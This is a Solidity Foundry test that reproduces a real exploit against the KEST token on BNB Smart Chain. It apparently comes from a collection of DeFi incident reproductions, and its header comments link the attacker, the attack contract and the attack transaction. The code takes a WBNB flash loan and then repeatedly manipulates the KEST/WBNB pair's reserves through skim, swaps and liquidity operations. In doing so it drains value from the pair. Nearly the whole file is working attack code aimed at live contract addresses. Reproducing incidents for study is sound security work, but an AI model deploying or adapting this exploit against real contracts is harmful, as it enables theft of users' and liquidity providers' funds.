// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$2.3K
// Attacker : https://bscscan.com/address/0x90c4c1aa895a086215765ec9639431309633b198
// Attack Contract : https://bscscan.com/address/0xc25979956d6f6acfc3702c68dff7a4d871eee4aa
// Vulnerable Contract : https://bscscan.com/address/0x7dda132dd57b773a94e27c5caa97834a73510429
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x2fcee04e64e54f3dd9c15db9ae44e4cbdd57ab4c6f01941a3acf470dc60bfc16

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x7dda132dd57b773a94e27c5caa97834a73510429#code

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/MetaSec_xyz/status/1736077719849623718
// Hacking God :

contract KESTExploit is BaseTestWithBalanceLog {
    ILendingPool private constant Radiant = ILendingPool(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);
    Uni_Router_V2 private constant PancakeRouter = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 private constant KEST = IERC20(0x7dda132dd57b773a94E27c5CAA97834A73510429);
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Pair_V2 private constant KEST_WBNB = Uni_Pair_V2(0x2D9fFa7ea5D1aAabA58e60168517b49F57E7f85b);

    uint256 private constant flashAmount = 200e18;
    uint256 private constant blocknumToForkFrom = 34_402_343;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        vm.label(address(Radiant), "Radiant");
        vm.label(address(PancakeRouter), "PancakeRouter");
        vm.label(address(KEST), "KEST");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(KEST_WBNB), "KEST_WBNB");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter WBNB balance before attack",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );

        address[] memory assets = new address[](1);
        assets[0] = address(WBNB);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        Radiant.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);

        emit log_named_decimal_uint(
            "Exploiter WBNB balance after attack",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        WBNB.approve(address(PancakeRouter), type(uint256).max);
        KEST.approve(address(PancakeRouter), type(uint256).max);
        KEST_WBNB.approve(address(PancakeRouter), type(uint256).max);

        WBNBToKEST(1e16);
        (uint112 reserveKEST, uint112 reserveWBNB, ) = KEST_WBNB.getReserves();
        uint256 amountWBNBtoTransfer = PancakeRouter.quote(KEST.balanceOf(address(this)), reserveKEST, reserveWBNB);
        WBNB.transfer(address(KEST_WBNB), amountWBNBtoTransfer);
        KEST.transfer(address(KEST_WBNB), KEST.balanceOf(address(this)));
        KEST_WBNB.mint(address(this));

        uint256 i;
        while (i < 9) {
            WBNBToKEST(WBNB.balanceOf(address(this)));
            uint256 cachedKESTBalance = KEST.balanceOf(address(this));
            KEST.transfer(address(KEST_WBNB), cachedKESTBalance);
            KEST_WBNB.skim(address(KEST_WBNB));
            (reserveKEST, reserveWBNB, ) = KEST_WBNB.getReserves();
            uint256 amountIn = KEST.balanceOf(address(KEST_WBNB)) - reserveKEST;
            uint256 amountOut = PancakeRouter.getAmountOut(amountIn, reserveKEST, reserveWBNB);
            KEST_WBNB.swap(0, amountOut, address(this), bytes(""));

            amountOut = (cachedKESTBalance * 75) / 100;
            address[] memory path = new address[](2);
            path[0] = address(WBNB);
            path[1] = address(KEST);
            PancakeRouter.swapTokensForExactTokens(
                amountOut,
                WBNB.balanceOf(address(this)),
                path,
                address(PancakeRouter),
                block.timestamp + 1_000
            );

            PancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
                address(KEST),
                1e15,
                1,
                1,
                address(this),
                block.timestamp + 1_000
            );
            KESTToWBNB();
            ++i;
        }
        WBNB.approve(address(Radiant), flashAmount + premiums[0]);
        return true;
    }

    receive() external payable {}

    function WBNBToKEST(uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(KEST);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            address(this),
            block.timestamp + 1_000
        );
    }

    function KESTToWBNB() private {
        address[] memory path = new address[](2);
        path[0] = address(KEST);
        path[1] = address(WBNB);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            KEST.balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp + 1_000
        );
    }
}
